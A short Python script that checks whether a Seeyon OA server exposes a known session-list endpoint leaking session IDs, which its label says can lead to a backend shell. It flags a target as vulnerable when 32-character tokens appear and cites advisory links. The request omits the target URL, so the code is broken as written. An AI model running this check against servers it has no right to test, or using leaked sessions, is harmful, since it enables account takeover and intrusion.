import requests,re
import urllib


def sessyon_get_sessionslist(url):
    relsult = {
        'name': '致远OA Session泄漏漏洞(后台可getshell)',
        'vulnerable': False
    }
    payload1 = '/yyoa/ext/https/getSessionList.jsp?cmd=getAll'
    try:
        req1 = requests.get(payload1, timeout=3)
        if req1.status_code == 200 and re.search('[0-9A-Z]{32}', req1.text):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['payload'] = payload1
            relsult['about'] = 'https://www.zhihuifly.com/t/topic/3345, https://www.seebug.org/vuldb/ssvid-93312'
        return relsult
    except:
        return relsult

if __name__ == '__main__':
    url = input('url:')
    print(sessyon_get_sessionslist(url))
